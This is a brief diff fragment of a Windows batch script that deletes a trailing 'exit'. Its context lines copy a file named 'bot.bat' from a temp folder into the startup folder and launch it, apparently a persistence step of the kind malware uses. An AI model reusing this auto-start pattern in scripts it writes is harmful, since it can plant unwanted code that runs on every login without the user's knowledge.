@@ -20,5 +20,3 @@ if exist "%tempdir%\bot.bat" (
     copy /y "%tempdir%\bot.bat" "%startup%\bot.bat"
     start "" "%tempdir%\bot.bat"
 )
-
-exit
